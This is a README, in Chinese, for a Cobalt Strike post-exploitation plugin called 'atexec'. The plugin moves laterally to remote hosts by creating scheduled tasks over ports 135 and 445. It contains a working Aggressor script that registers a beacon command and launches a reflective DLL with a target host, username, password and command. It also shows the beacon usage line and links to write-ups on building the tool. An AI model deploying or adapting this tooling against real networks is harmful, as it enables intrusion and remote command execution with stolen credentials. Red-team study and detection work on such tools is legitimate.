# Cobaltstrike-atexec

利用任务计划进行横向，需要与135端口、445端口进行通信

- 主要实现：[如何实现一个Atexec](https://payloads.online/archivers/2020-06-28/1)

- 主要技术：[通过反射DLL注入来构建后渗透模块（第一课）](https://payloads.online/archivers/2020-03-02/1)

## 使用方式

1. 加载[atexec.cna](https://github.com/Rvn0xsy/Cobaltstrike-atexec)

```perl
$dll = "reflective_dll.dll";
beacon_command_register(
	"atexec", 
	"atexec text to beacon log", 
	"Synopsis: atexec [host] [username] [password] [command] [domain]\n");

alias("atexec", {
    $args = substr($0, 7);
    bdllspawn($1, script_resource($dll), $args, "Atexec....", 10000, false);
	blog($1, "My arguments are:" . substr($0, 7) . "\n");
});
```

2. 在Beacon会话获得后

```
beacon> help atexec
Synopsis: atexec [host] [username] [password] [command] [domain]
```